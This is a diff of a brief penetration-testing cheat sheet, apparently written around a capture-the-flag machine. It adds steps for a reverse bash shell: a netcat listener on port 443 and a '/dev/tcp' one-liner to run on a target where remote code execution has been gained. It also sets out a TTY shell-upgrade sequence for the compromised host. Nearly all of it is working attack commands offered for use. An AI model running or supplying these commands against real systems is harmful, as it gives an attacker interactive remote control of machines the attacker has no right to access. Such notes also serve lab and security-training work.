@@ -1,15 +1,21 @@
+Reverse Bash Shell
+
+  1. start listener over non blocked port like 443 == nc -lvnp 443
+
+  2. Then insert this command where you have rce == 'bash -c "bash -i >& /dev/tcp/<myip>/443 0>&1"'
+
 Shell upgrade script
 
-$ script /dev/null -c bash
-Script started, file is /dev/null
+1. First set up listener
+            kali@kali$ nc -lvnp 443
 
-puma@sau:/opt/maltrail$ ^Z
-[1]+  Stopped                 nc -lnvp 443
+2. Run this from compromised machine
+            comprompisedshell$ script /dev/null -c bash
 
-oxdf@hacky$ stty raw -echo; fg
-nc -lnvp 443
-            reset
-reset: unknown terminal type unknown
-Terminal type? screen
+3. Then background the shell
+            puma@sau:/opt/maltrail$ ^Z
 
-puma@sau:/opt/maltrail$ 
+4. Then run this.
+            kali@kali$ stty raw -echo; fg
+
+upgraded@shell:/opt/maltrail$ 
